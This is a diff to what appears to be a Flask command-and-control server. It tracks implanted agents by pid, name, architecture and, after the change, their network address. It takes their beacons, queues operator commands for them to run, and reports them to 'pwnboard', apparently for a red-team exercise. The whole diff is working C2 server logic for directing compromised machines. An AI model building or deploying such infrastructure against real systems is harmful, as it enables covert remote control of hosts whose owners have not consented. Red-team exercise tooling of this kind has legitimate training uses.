@@ -56,6 +56,7 @@ def register():
             "pid": data[3],
             "name": data[4],
             "arch": data[5],
+            "address": data[6],
             "beacon": datetime.now().strftime("%H:%M:%S"),
         }
     }
@@ -93,7 +94,11 @@ def beacon():
 
     agents.update_one(filter, values)
 
-    update_pwnboard(("10.1.1.10", 8000))
+    query = {"address"}
+
+    address_json = agents.find_one(filter, query)
+
+    update_pwnboard((address_json["address"], 8000))
 
     query = {"id"}
 
@@ -105,28 +110,36 @@ def beacon():
         return queue.get()
     else:
         return ""
-    
+
+
 @app.route("/api/output", methods=["POST"])
 def output():
     print(request.data)
 
     return ""
 
+
 @app.route("/api/client/queue", methods=["POST"])
 def queue():
     json = request.get_json()
 
-    queue = map.get(json["id"])
+    try:
+        queue = map.get(json["id"])
 
-    if "param" in json:
-        queue.put(json["command"] + " " + json["param"])
-    else:
-        queue.put(json["command"])
+        if "param" in json:
+            queue.put(json["command"] + " " + json["param"])
+        else:
+            queue.put(json["command"])
 
-    if queue.full():
+        if queue.full():
+            return "Error"
+        else:
+            return ""
+    
+    except:
+        print("Queue does not exist")
         return "Error"
-    else:
-        return ""
+
 
 @app.route("/api/client/agents")
 def get():
